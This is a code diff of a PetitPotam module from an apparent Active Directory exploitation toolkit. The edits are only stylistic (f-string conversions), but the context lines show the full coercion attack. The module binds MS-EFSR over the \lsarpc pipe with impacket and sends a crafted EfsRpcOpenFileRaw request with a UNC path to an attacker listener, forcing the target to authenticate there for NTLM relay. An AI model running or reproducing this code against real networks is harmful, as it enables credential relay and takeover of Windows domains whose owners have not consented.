@@ -1,5 +1,4 @@
-"""PetitPotam — NTLM relay via EfsRpcOpenFileRaw (MS-EFSR)."""
-from __future__ import annotations
+"""PetitPotam  -  NTLM relay via EfsRpcOpenFileRaw (MS-EFSR)."""
 import sys
 from typing import Any
 from adxpl.core.credential import ADCredential
@@ -23,7 +22,7 @@ def run(args: Any) -> int:
         print("[!] --listener required (capture host for NTLM relay)", file=sys.stderr)
         return 1
 
-    print("[*] PetitPotam: {} → coerce to {}".format(target, listener))
+    print(f"[*] PetitPotam: {target} → coerce to {listener}")
 
     try:
         from impacket.dcerpc.v5 import transport, epm
@@ -37,7 +36,7 @@ def run(args: Any) -> int:
     pipe = "\\lsarpc"
 
     try:
-        string_binding = "ncacn_np:{}[{}]".format(target, pipe)
+        string_binding = f"ncacn_np:{target}[{pipe}]"
         rpc_transport = transport.DCERPCTransportFactory(string_binding)
 
         if cred.username:
@@ -49,8 +48,8 @@ def run(args: Any) -> int:
         dce.connect()
         dce.bind(EFSR_UUID)
 
-        unc_path = "\\\\{}\\share\\file".format(listener)
-        print("[*] Calling EfsRpcOpenFileRaw with UNC: {}".format(unc_path))
+        unc_path = f"\\\\{listener}\\share\\file"
+        print(f"[*] Calling EfsRpcOpenFileRaw with UNC: {unc_path}")
 
         from impacket.dcerpc.v5.ndr import NDRSTRUCT, NDRPOINTER, NDRUNION
         import struct
@@ -64,14 +63,14 @@ def run(args: Any) -> int:
         request += b"\x00\x00\x00\x00"
 
         dce.call(0, request)
-        print("[+] PetitPotam coercion sent — check relay listener on {}".format(listener))
+        print(f"[+] PetitPotam coercion sent  -  check relay listener on {listener}")
         dce.disconnect()
         return 0
 
     except Exception as exc:
         error_str = str(exc)
         if "rpc_s_access_denied" in error_str.lower():
-            print("[-] Access denied — unauthenticated coercion may be patched")
+            print("[-] Access denied  -  unauthenticated coercion may be patched")
         else:
-            print("[+] Coercion likely triggered (error expected): {}".format(error_str))
+            print(f"[+] Coercion likely triggered (error expected): {error_str}")
         return 0
